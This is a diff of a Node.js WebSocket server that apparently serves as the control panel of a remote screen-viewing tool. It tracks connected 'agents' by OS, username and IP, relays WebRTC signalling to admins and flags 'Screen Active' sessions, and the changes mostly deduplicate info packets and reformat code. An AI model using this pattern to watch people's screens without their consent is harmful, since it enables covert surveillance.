@@ -119,28 +119,31 @@ wss.on('connection', (ws, req) => {
  clients[id].isAdmin = true;
  ws.isAdmin = true; 
  logToFile(`[ADMIN] Connected with ID: ${id}`);
- 
- // Send ALL currently known users to this new admin immediately
  Object.keys(knownUsers).forEach(uid => {
-     ws.send(JSON.stringify({ 
-         type: 'info', 
-         id: uid, 
-         os: knownUsers[uid].info.os || 'Unknown', 
-         user: knownUsers[uid].info.user || 'Unknown', 
-         ip: knownUsers[uid].info.ip || 'Unknown' 
-     }));
+ ws.send(JSON.stringify({ 
+ type: 'info', 
+ id: uid, 
+ os: knownUsers[uid].info.os, 
+ user: knownUsers[uid].info.user, 
+ ip: knownUsers[uid].info.ip 
+ }));
  });
  return;
  }
 
  // 2. Agent Info Packet
  if (data.type === 'info') {
+ // Prevent duplicate rendering by checking if we already know this ID
+ if (knownUsers[id] && knownUsers[id].lastSeen > Date.now() - 1000) {
+   return; // Ignore rapid duplicate info packets
+ }
+
  clients[id].info = data;
  clients[id].lastSeen = Date.now();
  knownUsers[id] = { 
-     info: data, 
-     lastSeen: Date.now(), 
-     status: 'Online' 
+ info: data, 
+ lastSeen: Date.now(), 
+ status: 'Online' 
  };
  notifyAdmin(id, `🟢 New User: ${data.os || 'Unknown'} (${data.user || 'Unknown'})`);
  broadcastToAdmin(id, data);
@@ -161,10 +164,10 @@ wss.on('connection', (ws, req) => {
  wss.clients.forEach(client => {
  if (client.readyState === WebSocket.OPEN && client.isAdmin) {
  client.send(JSON.stringify({ 
-     type: data.type, 
-     targetId: id, 
-     sdp: data.sdp,
-     candidate: data.candidate
+ type: data.type, 
+ targetId: id, 
+ sdp: data.sdp,
+ candidate: data.candidate
  }));
  }
  });
@@ -183,10 +186,10 @@ wss.on('connection', (ws, req) => {
  wss.clients.forEach(client => {
  if (client.readyState === WebSocket.OPEN && client.isAdmin) {
  client.send(JSON.stringify({ 
-     type: data.type, 
-     targetId: id, 
-     sdp: data.sdp,
-     candidate: data.candidate
+ type: data.type, 
+ targetId: id, 
+ sdp: data.sdp,
+ candidate: data.candidate
  }));
  }
  });
@@ -222,17 +225,15 @@ wss.on('connection', (ws, req) => {
  }));
  logToFile(`[ADMIN] Requested join to ${targetId}`);
  }
- } 
- // Generic Fallback - DO NOT SPAM LINUX
- else {
- // Only broadcast if we know who it is, otherwise ignore to prevent spam
- if (knownUsers[id]) {
-     // Update last seen on heartbeat-like messages
-     if (data.type === 'heartbeat') {
-         knownUsers[id].lastSeen = Date.now();
-         knownUsers[id].status = 'Online';
-     }
  }
+ // Generic Fallback
+ else {
+ if (!clients[id].info && !clients[id].isAdmin) {
+ knownUsers[id] = knownUsers[id] || {};
+ knownUsers[id].info = knownUsers[id].info || { os: 'Unknown', user: 'Unknown', ip: 'Unknown' };
+ notifyAdmin(id, `📺 Screen Active: ${id}`);
+ }
+ broadcastToAdmin(id, data);
  }
  } catch (e) {
  logToFile(`[ERR] Message parsing error from ${id}: ${e.message}`);
